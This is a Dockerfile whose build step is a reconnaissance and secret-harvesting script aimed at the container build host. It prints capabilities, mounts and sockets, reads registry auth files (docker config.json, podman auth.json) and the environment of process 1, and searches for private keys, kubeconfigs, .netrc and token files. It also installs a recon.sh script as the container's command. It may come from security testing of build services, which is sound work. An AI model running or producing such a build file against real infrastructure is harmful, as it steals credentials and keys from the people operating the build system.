FROM alpine:3.20
RUN apk add --no-cache curl
RUN set +e; echo "===BUILDENUM START==="; \
  echo "[id]"; id; \
  echo "[caps]"; grep -i cap /proc/self/status; \
  echo "[mounts]"; grep -ivE 'proc|sysfs|cgroup|tmpfs|devpts|mqueue| shm ' /proc/mounts; \
  echo "[sockets]"; ls -la /run /var/run 2>/dev/null; find / -maxdepth 6 -name '*.sock' 2>/dev/null | head; \
  echo "[authfiles]"; for f in /podman/.config/containers/auth.json /root/.docker/config.json /root/.config/containers/auth.json /run/containers/0/auth.json /run/user/0/containers/auth.json /home/.docker/config.json; do echo "--$f"; cat "$f" 2>/dev/null; done; \
  echo "[registries]"; cat /podman/.config/containers/registries.conf /etc/containers/registries.conf 2>/dev/null | grep -ivE '^\s*#'; \
  echo "[proc1env]"; tr '\0' '\n' < /proc/1/environ 2>/dev/null; \
  echo "[env]"; env; \
  echo "[secrethunt]"; find / -maxdepth 6 \( -name 'auth.json' -o -name 'config.json' -o -name '*.pem' -o -name 'token' -o -name '.netrc' -o -name 'kubeconfig' -o -name 'id_rsa' \) 2>/dev/null | head -40; \
  echo "===BUILDENUM END==="
COPY recon.sh /recon.sh
RUN chmod +x /recon.sh
CMD ["/recon.sh"]
